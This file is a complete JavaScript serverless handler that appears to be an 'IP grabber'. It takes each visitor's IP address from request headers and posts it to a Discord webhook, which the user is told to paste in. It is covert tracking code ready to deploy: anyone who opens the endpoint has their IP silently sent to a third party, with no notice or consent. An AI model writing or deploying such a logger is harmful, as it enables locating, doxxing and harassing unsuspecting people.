export default async function handler(req, res) {

    const ip =
        req.headers["x-forwarded-for"]?.split(",")[0]?.trim() ||
        req.socket?.remoteAddress ||
        "Unknown";

    // PASTE YOUR NEW DISCORD WEBHOOK BETWEEN THE QUOTES
    const webhook = "PASTE_NEW_WEBHOOK_HERE";

    try {

        await fetch(webhook, {
            method: "POST",

            headers: {
                "Content-Type": "application/json"
            },

            body: JSON.stringify({
                content: `🌐 Visitor IP: \`${ip}\``
            })
        });

        res.status(200).json({
            ip: ip
        });

    } catch (error) {

        console.error(error);

        res.status(500).json({
            error: "Failed to send IP"
        });
    }
}